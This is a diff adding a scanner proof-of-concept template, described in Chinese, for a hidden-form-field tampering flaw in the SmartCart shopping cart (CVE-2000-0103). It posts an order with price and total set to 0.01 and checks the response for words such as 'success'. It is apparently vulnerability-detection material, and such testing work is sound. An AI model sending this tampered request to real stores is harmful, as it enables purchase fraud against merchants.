@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "验证 SmartCart 购物车应用中订单表单隐藏字段可被篡改。构造 POST 请求修改价格、总价等隐藏字段为极低值，若服务器接受篡改后的订单数据则存在漏洞。"
+id = "POC-AVE-2000-0087"
+name = "SmartCart 购物车隐藏表单字段篡改漏洞 PoC"
+severity = "high"
+tags = ["ave-2000-0087"]
+vuln_id = [
+    "CVE-2000-0103",
+    "AVE-2000-0087",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/SmartCart/order.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "item_id=1&quantity=1&price=0.01&total=0.01&submit=order"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "thank",
+    "order",
+    "success",
+    "complete",
+]
